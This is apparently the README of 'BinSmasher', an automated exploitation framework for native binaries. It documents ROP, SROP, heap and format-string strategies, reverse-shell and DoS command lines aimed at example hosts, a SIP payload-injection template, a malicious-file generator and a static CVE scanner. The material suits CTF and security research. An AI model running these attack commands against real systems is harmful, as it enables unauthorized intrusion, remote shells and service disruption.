# BinSmasher 🔨

**Ultimate Cross-Platform Binary Exploitation Framework**

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/66969605-fcae-48b9-9096-350778bdab99" />

> Authorized use only: CTF · pentest · security research  
> Unauthorized access to systems you do not own is illegal.

---

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Architecture](#architecture)
4. [Subcommands](#subcommands)
5. [binary — Full Reference](#binary--full-reference)
6. [Exploit Techniques — TCP Mode](#exploit-techniques--tcp-mode)
7. [Exploit Techniques — UDP+Spawn Mode](#exploit-techniques--udpspawn-mode)
8. [Custom Payload Mode — Deep Dive](#custom-payload-mode--deep-dive)
9. [file — Malicious File Generation](#file--malicious-file-generation)
10. [solana — Agave / Solana SVM Auditing](#solana--agave--solana-svm-auditing)
11. [Usage Examples](#usage-examples)
12. [Technique Decision Tree](#technique-decision-tree)
13. [Known Limitations](#known-limitations)
14. [Dependencies](#dependencies)

---

## Overview

BinSmasher automates the full exploitation lifecycle for native binaries:

1. **Static analysis** — finds vulnerable functions, protections, gadgets
2. **Offset detection** — cyclic pattern + corefile / GDB / remote crash scan
3. **Strategy selection** — automatically picks the best exploit technique
4. **Exploit delivery** — sends payload, verifies RCE via callback listener
5. **Script generation** — writes standalone crash/exploit scripts

It handles both **TCP services** (interactive recv/send) and **UDP crash-and-die services** (spawn-target mode with process management).

---

## Installation

```bash
# System dependencies
sudo apt-get install -y python3 python3-pip gdb radare2 \
    pwndbg one_gadget binutils file socat

# Python dependencies
pip install pwntools capstone keystone-engine \
    frida-tools ropper boofuzz rich

# Optional: AFL++ for coverage fuzzing
sudo apt-get install -y afl++

# Clone (or unzip the release)
git clone https://github.com/your-org/binsmasher
cd binsmasher

# Run directly (no install required)
python3 src/main.py --help

# Or install as a global command
pip install -e .
binsmasher --help
```

---

## Architecture

```
binsmasher/
├── src/
│   ├── main.py                    # Entry point & CLI
│   ├── binsmasher_main.py         # Pip console-script shim (ensures src/ is on path)
│   ├── utils/                     # Config, logging, display helpers
│   │   ├── _process.py            # Core-dump suppression, temp dirs, no-junk-in-CWD
│   │   ├── config.py              # ExploitConfig dataclass
│   │   ├── display.py             # print_summary, RichHelpFormatter
│   │   └── logging_setup.py       # setup_logging
│   ├── analyzer/                  # Static/dynamic analysis, protections, libc
│   │   ├── static.py              # r2 static analysis, function discovery
│   │   ├── protections.py         # NX, ASLR, canary, RELRO, PIE detection
│   │   ├── dynamic.py             # Frida instrumentation, setup_context
│   │   ├── library.py             # libc offset loading, libc.rip queries
│   │   ├── seccomp.py             # seccomp-tools integration, patchelf
│   │   └── recovery.py            # Stripped binary recovery, angr
│   ├── exploiter/                 # All exploit primitives
│   │   ├── connection.py          # TCP/UDP connection management
│   │   ├── offset.py              # Cyclic pattern, corefile, GDB offset detection
│   │   ├── rop_chains.py          # ret2win, ret2libc, SROP, ORW, ret2dlresolve
│   │   ├── heap.py                # UAF, fastbin, tcache, largebin, House of Apple2
│   │   ├── gadgets.py             # ROPgadget/ropper integration, one_gadget
│   │   ├── shellcode.py           # Shellcode generation + XOR encoding
│   │   ├── format_string.py       # fmtstr_payload, GOT overwrite
│   │   ├── windows.py             # SafeSEH, CFG, CFI bypass
│   │   ├── scripts.py             # Crash/exploit script generation
│   │   ├── orchestrator.py        # create_exploit — master TCP strategy selector
│   │   ├── udp_strategies.py      # UDP+spawn exploit engine (A–F strategies)
│   │   └── helpers.py             # Address utilities, process spawning
│   ├── fuzzer/                    # Fuzzing and offset detection
│   │   ├── afl.py                 # AFL++ coverage-guided fuzzing
│   │   ├── boofuzz_fuzz.py        # boofuzz network fuzzing
│   │   ├── mutation.py            # Built-in mutation fuzzer
│   │   ├── udp.py                 # UDP offset detection (bisect + corefile)
│   │   ├── core_analysis.py       # Core dump analysis, GDB crash analysis
│   │   ├── gdb_scripts.py         # GDB script generation (pwndbg/peda/vanilla)
│   │   ├── offset_roto.py         # ROTO heuristic, SIGFAULT analysis
│   │   └── solana.py              # Solana/Agave SVM fuzzing
│   └── file_exploiter/            # Malicious file builders
│       ├── audio.py               # MP3, WAV, FLAC, OGG, AAC
│       ├── documents.py           # PDF, DOC, DOCX, XLS, XLSX, RTF
│       ├── web.py                 # TXT, CSV, JSON, XML, HTML, SVG
│       ├── images.py              # BMP, PNG, GIF, JPEG
│       ├── scripts_fmt.py         # PY, JS, PHP, LUA, RB
│       └── archives.py            # ZIP, TAR, ELF
├── tests/
│   ├── test_suite.py              # Integration test runner
│   ├── bins/                      # Compiled test binaries (built by make)
│   └── src/                       # C sources + Makefile
│       ├── Makefile
│       ├── t1_stack_noprotect.c … t11_heap_glibc234.c
│       ├── t_shellexec.c          # CMD exec test (win→system)
│       └── t_revshell.c           # Reverse shell test (win→connect-back)
├── setup.py
└── pyproject.toml
```

**`exploiter/udp_strategies.py`** contains the UDP+spawn exploit engine:

| Function | Purpose |
|---|---|
| `_find_system_and_binsh()` | Locate system() and /bin/sh in libc |
| `_find_libc_path()` | Find libc.so.6 on disk |
| `_addr_ok()` | Check address against bad bytes |
| `_spawn_and_read_bases()` | Spawn binary, read PIE+libc bases from /proc |
| `_attempt_rop_system()` | Strategy A: pop rdi + /bin/sh + system() |
| `_attempt_srop()` | Strategy B: sigreturn frame → execve |
| `_attempt_got_overwrite()` | Strategy C: overwrite GOT entry with system() |
| `_attempt_ret2win()` | Strategy D: jump to win/flag/shell function |
| `_attempt_one_gadget()` | Strategy E: libc magic gadget |
| `_attempt_orw()` | Strategy F: open/read/write flag (seccomp) |
| `_run_udp_spawn_exploit()` | Orchestrator: tries A→F in order |

---

## Subcommands

```bash
# Direct run
python3 src/main.py binary   [options]   # Exploit native ELF/PE binaries
python3 src/main.py file     [options]   # Generate malicious files
python3 src/main.py solana   [options]   # Agave / Solana SVM auditing

# If installed via pip
binsmasher binary   [options]
binsmasher file     [options]
binsmasher solana   [options]
```

---

## binary — Full Reference

### Basic Options

| Flag | Default | Description |
|---|---|---|
| `-b`, `--binary` | required | Path to target binary |
| `-c`, `--cmd` | `id` | Command to execute via shellcode |
| `-p`, `--pattern-size` | `200` | Initial cyclic pattern size |
| `-r`, `--return-addr` | auto | Hex return address (skips auto-detection) |
| `--return-offset` | `80` | Byte offset from stack addr to return addr |
| `-t`, `--test-exploit` | off | Fire exploit and verify output via callback |
| `-l`, `--log-file` | auto in /tmp | Log file path (DEBUG level written to file) |

### Network Options

| Flag | Default | Description |
|---|---|---|
| `--host` | `localhost` | Target host |
| `--port` | `4444` | Target port |
| `--tls` | off | Use TLS/SSL for the connection |
| `--output-ip` | `127.0.0.1` | Listener IP for shellcode callback / revshell |
| `--output-port` | `6666` | Listener port for shellcode callback / revshell |

### Payload Options

| Flag | Default | Description |
|---|---|---|
| `--reverse-shell` | off | Generate reverse shell payload |
| `--file-input` | — | Embed shellcode inside `mp3` or `raw` file |
| `--binary-args` | `""` | Arguments to pass to the binary when spawning it |
| `--payload-data` | — | Custom payload template. Supports `{PAYLOAD}` placeholder. |
| `--udp` | off | Send `--payload-data` via UDP |
| `--spawn-target` | off | Spawn the binary locally for crash detection |
| `--bad-bytes` | `""` | Hex bytes to avoid in exploit addresses (e.g. `0a0d`) |

### Custom Payload Mode (UDP+Spawn)

Enabled when **all three** are present: `--payload-data` + `--udp` + `--spawn-target`.

### Fuzzing Options

| Flag | Default | Description |
|---|---|---|
| `--fuzz` | off | boofuzz network fuzzer |
| `--mutation-fuzz` | off | Built-in mutation fuzzer |
| `--afl-fuzz` | off | AFL++ coverage-guided fuzzing |
| `--afl-timeout` | `60` | AFL++ runtime in seconds |
| `--frida` | off | Frida dynamic instrumentation |
| `--protocol` | `raw` | Protocol hint for boofuzz |

### Advanced Exploit Options

| Flag | Default | Description |
|---|---|---|
| `--heap-exploit` | off | Enable heap exploitation path |
| `--safeseh-bypass` | off | SafeSEH bypass (Windows) |
| `--privilege-escalation` | off | Post-exploitation privesc attempt |
| `--cfi-bypass` | off | CFI bypass via valid-target pivot |
| `--stack-pivot` | off | Build stack pivot chain using `leave; ret` |
| `--largebin-attack` | off | Largebin attack for glibc ≥ 2.28 |
| `--gdb-mode` | `pwndbg` | GDB script flavour: `pwndbg`, `peda`, `vanilla` |
| `--srop` | off | Force Sigreturn-Oriented Programming chain |
| `--orw` | off | Force ORW chain (seccomp bypass) |
| `--flag-path` | `/flag` | Flag file path for ORW chain |

### DOS / Script Generation

| Flag | Description |
|---|---|
| `--dos` | Find offset, crash target, generate `crash_<binary>.py` and `exploit_<binary>.py` |
| `--generate-scripts` | Always write standalone scripts (even on success) |

---

## Exploit Techniques — TCP Mode

| # | Technique | Trigger condition |
|---|---|---|
| 0 | **ret2win** | Win/flag/shell symbol in binary |
| 1 | **Libc leak** | ASLR on, offsets known |
| 2 | **Canary leak/brute** | `canary_enabled=True` |
| 3 | **PIE leak** | PIE on |
| 4 | **ret2system ROP** | NX on, libc base known |
| 5 | **ret2csu** | No `pop rdi` gadget |
| 6 | **SROP** | `--srop` or no other path |
| 7 | **ORW** | `--orw` or seccomp detected |
| 8 | **Format string** | Printf family detected, Partial RELRO |
| 9 | **Shellcode** | NX off |
| 10 | **ret2libc static** | NX on, no ASLR |
| 11 | **ret2libc ASLR** | NX on, ASLR on, libc known |
| 12 | **ret2dlresolve** | No libc leak available |
| 13 | **Heap UAF** | `--heap-exploit`, heap functions |
| 14 | **Fastbin dup** | `--heap-exploit`, glibc < 2.29 |
| 15 | **one_gadget** | one_gadget installed |
| 16 | **CFI bypass** | `--cfi-bypass` |
| 17 | **SafeSEH bypass** | `--safeseh-bypass`, Windows |
| 18 | **Stack pivot** | `--stack-pivot` |
| 19 | **Largebin attack** | `--largebin-attack`, glibc ≥ 2.28 |

---

## Exploit Techniques — UDP+Spawn Mode

| Strategy | Name | Viable when |
|---|---|---|
| A | **ret2system ROP** | `ret_addr_offset + 24 < min_crash` AND pop rdi gadget available |
| A* | **ret2csu fallback** | Same as A but uses `__libc_csu_init` |
| B | **SROP** | `syscall;ret` + `pop rax;ret` AND `ret_addr_offset + 272 < min_crash` |
| C | **GOT overwrite** | Write-what-where primitive detected |
| D | **ret2win** | Win symbol in binary AND `ret_addr_offset + 8 < min_crash` |
| E | **one_gadget** | `one_gadget` installed AND no bad bytes AND fits |
| F | **ORW** | `--orw` flag set AND chain fits |

---

## Custom Payload Mode — Deep Dive

### How it Works

```
1. BISECT: find min_crash_sz (first payload size that causes SIGSEGV)
2. COREDUMP: inject cyclic(min_crash_sz), collect core → extract RIP → stack scan
3. PROCESS BASES: read PIE base + libc base from /proc/PID/maps
4. EXPLOIT: try strategies A→F (spawn fresh binary per attempt for clean ASLR)
```

### Payload Template Format

Use `{PAYLOAD}` as the injection placeholder. `Content-Length:` is auto-recalculated.

**SIP INVITE example:**
```
INVITE sip:target@127.0.0.1 SIP/2.0
...
a=ice-ufrag:{PAYLOAD}
```

**HTTP POST example:**
```
POST /upload HTTP/1.1
Content-Length: {CONTENT_LENGTH}

{PAYLOAD}
```

### Bad Bytes

| Protocol | `--bad-bytes` | Reason |
|---|---|---|
| Raw TCP/UDP | *(empty)* | No restriction |
| SIP / SDP | `0a0d` | `\n` and `\r` terminate SDP lines |
| HTTP headers | `0a0d` | `\r\n` terminates headers |
| Null-terminated C string | `00` | `\0` terminates strcpy/gets |
| C string + newline | `000a0d` | Combined |

---

## file — Malicious File Generation

```bash
python3 src/main.py file \
  --format mp3 \
  --offset 256 \
  --technique overflow \
  --shellcode-hex 90909090...  \
  -o ./payloads/
```

| Category | Formats |
|---|---|
| Audio | `mp3`, `wav`, `flac`, `ogg`, `aac` |
| Documents | `pdf`, `doc`, `docx`, `xls`, `xlsx`, `rtf`, `txt`, `csv` |
| Data | `json`, `xml`, `html`, `svg` |
| Images | `bmp`, `png`, `gif`, `jpeg` |
| Code | `py`, `js`, `php`, `lua`, `rb` |
| Archives | `zip`, `tar` |
| Binary | `elf`, `raw` |

```bash
# Generate all formats at once
python3 src/main.py file --all-formats --offset 512 -o ./payloads/
```

---

## solana — Agave / Solana SVM Auditing

```bash
python3 src/main.py solana \
  --rpc http://localhost:8899 \
  --source-path ./agave/src \
  --exploit-type svm-bpf
```

| `--exploit-type` | Description |
|---|---|
| `svm-bpf` | BPF program verifier bypass |
| `deser` | Account deserialization vulnerability |
| `dos-quic` | QUIC connection denial of service |
| `snapshot-assert` | Snapshot loading assertion panic |

---

## Usage Examples

### CTF — Simple Stack Overflow (TCP)
```bash
python3 src/main.py binary -b ./vuln --host 127.0.0.1 --port 4444 -t
```

### CTF — ret2win (no ASLR)
```bash
python3 src/main.py binary -b ./pwn1 --host 127.0.0.1 --port 1337 -t
```

### CTF — ASLR + NX + PIE (full mitigations)
```bash
python3 src/main.py binary -b ./hard_pwn \
  --host 127.0.0.1 --port 9001 \
  --output-ip 10.0.0.1 --output-port 4444 \
  -t --generate-scripts
```

### CTF — Force SROP
```bash
python3 src/main.py binary -b ./srop_chal --host 127.0.0.1 --port 3333 --srop -t
```

### CTF — ORW / Seccomp Bypass
```bash
python3 src/main.py binary -b ./sandboxed_chal \
  --host 127.0.0.1 --port 8888 \
  --orw --flag-path /home/ctf/flag.txt -t
```

### Pentest — SIP/UDP Service (CVE-style)
```bash
cat > invite.txt << 'EOF'
INVITE sip:target@127.0.0.1 SIP/2.0
Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bK-test
From: <sip:attacker@127.0.0.1>;tag=1234
To: <sip:target@127.0.0.1>
Call-ID: attack@127.0.0.1
CSeq: 1 INVITE
Content-Type: application/sdp
Content-Length: {CONTENT_LENGTH}

v=0
o=- 0 0 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
a=ice-ufrag:{PAYLOAD}
a=ice-pwd:somepassword1234567890123
m=audio 5004 RTP/AVP 0
EOF

python3 src/main.py binary \
  -b /path/to/sip_server \
  --host 127.0.0.1 --port 5060 \
  --udp --spawn-target \
  --binary-args "--local-port=5060 --log-level=0" \
  --bad-bytes 0a0d \
  --output-ip 127.0.0.1 --output-port 6666 \
  --payload-data "$(cat invite.txt)"
```

### Pentest — Reverse Shell
```bash
python3 src/main.py binary \
  -b ./remote_service \
  --host 192.168.1.100 --port 9999 \
  --reverse-shell \
  --output-ip 192.168.1.1 --output-port 4444 \
  -t
```

### DOS Mode
```bash
python3 src/main.py binary -b ./target \
  --host 192.168.1.50 --port 8080 \
  --dos --generate-scripts
```

---

## Running the Test Suite

```bash
# 1. Compile test binaries
cd tests/src && make && cd ../..

# 2. Run local tests (fast)
python tests/test_suite.py --local-only --skip-slow

# 3. Run everything including CMD + REVSHELL
python tests/test_suite.py --local-only

# 4. Run with CTF binary downloads
python tests/test_suite.py
```

---

## Technique Decision Tree

```
                      ┌─────────────────┐
                      │  Start          │
                      └────────┬────────┘
                               │
                    ┌──────────▼──────────┐
                    │  Win/flag symbol    │
                    │  in binary?         │
                    └──────────┬──────────┘
                       YES ────┼──── NO
                               │           │
                    ┌──────────▼────┐      │
                    │  ret2win      │      │
                    └───────────────┘      │
                                  ┌────────▼────────┐
                                  │  NX enabled?    │
                                  └────────┬────────┘
                               NO ─────────┼───── YES
                               │                    │
                    ┌──────────▼────┐    ┌──────────▼──────────┐
                    │  Shellcode    │    │  ASLR enabled?      │
                    └───────────────┘    └──────────┬──────────┘
                                         NO ────────┼──── YES
                                         │               │
                              ┌──────────▼────┐    ┌─────▼───────────┐
                              │ ret2libc      │    │  Libc leak      │
                              │ static        │    │  available?     │
                              └───────────────┘    └─────┬───────────┘
                                                  YES ───┼─── NO
                                                  │           │
                                       ┌──────────▼──┐  ┌─────▼───────┐
                                       │ ret2system  │  │ ret2dlresolve│
                                       │ / ret2csu   │  │ / SROP      │
                                       └─────────────┘  └─────────────┘
```

---

## Known Limitations

- **UDP+spawn mode**: Single-stage only. ret2plt+leak, DynELF, fmt-string leak, and stack pivot require a receive channel and are not supported.
- **Copy crash constraint**: If `ret_addr_offset + chain_len >= min_crash`, exploitation via that field is impossible. Find a different overflow field with a larger gap.
- **Windows**: SafeSEH/CFG exploits have limited testing — primarily designed for Linux/ELF.
- **ARM/MIPS/RISC-V**: Partial support; x86_64 is the primary target.

---

## Dependencies

| Tool | Required | Purpose |
|---|---|---|
| `python3` ≥ 3.9 | Yes | Runtime |
| `pwntools` | Yes | Exploit primitives, ROP, cyclic, ELF |
| `radare2` | Yes | Static analysis, gadget finding |
| `gdb` | Recommended | Offset detection strategy 2 |
| `socat` | Yes (tests) | TCP→stdin wrapper for test suite |
| `one_gadget` | Recommended | one_gadget strategy in UDP+spawn mode |
| `AFL++` | Optional | Coverage-guided fuzzing (`--afl-fuzz`) |
| `frida` | Optional | Dynamic instrumentation (`--frida`) |
| `boofuzz` | Optional | Network fuzzing (`--fuzz`) |

---

## CVE Scanner

<img width="1770" height="942" alt="image" src="https://github.com/user-attachments/assets/feacfd20-d743-4e29-96c4-42f9148ab327" />

**Static-only binary vulnerability scanner for responsible disclosure.**

BinSmasher performs automated static analysis on Linux ELF binaries, identifies dangerous function calls, applies data-flow taint analysis, and generates MITRE CVE records, interactive HTML reports, and structured JSON exports.

### Features

- **25+ dangerous functions detected** — `gets`, `strcpy`, `system`, `printf`, `recv`, `sprintf`, `memcpy`, `scanf`, and more
- **Static taint analysis** — `CONFIRMED` / `PROBABLE` / `UNCONFIRMED` confidence
- **Binary protection detection** — NX/DEP, PIE, stack canaries, RELRO, FORTIFY, Shadow Stack, ASLR
- **CVSS-adjusted risk scoring**
- **Multiple export formats**: HTML report, JSON (all/confirmed/probable), MITRE CVE templates

### Usage

```bash
python3 cve_scan.py                                    # Scan /usr/bin
python3 cve_scan.py /usr/sbin /opt/binaries            # Scan directories
python3 cve_scan.py --single /tmp/vuln_binary          # Single binary
python3 cve_scan.py --single ./target --confidence CONFIRMED --verbose
```

---

## Contributing

Contributions are welcome. Please open an issue or submit a pull request.

Areas for improvement:
- Support for additional architectures (ARM64, MIPS, RISC-V)
- More sophisticated taint propagation
- AI-powered analysis — BinSmasher Agent
- Docker container for easy deployment

---

## Donations

If BinSmasher has been useful in your research or competitions:

**ETH** — `0xD773B73C7ea4862020b7B5B58f31Ea491f5a9bA3`

**BTC** — `bc1ql6qvsk67hl5vz346kx4gueqjhp6me9ss8eflgt`

**SOL** — `GYBiTvVbPvPJP7ZK5oaqc9w6UtHvd6NkhSPP2UBhDvfh`

---

## Authors

**AncientEncoder**

**A. Canto** — InsecureWorld

**V. Nos** — Cryptocalypse

BinSmasher Team
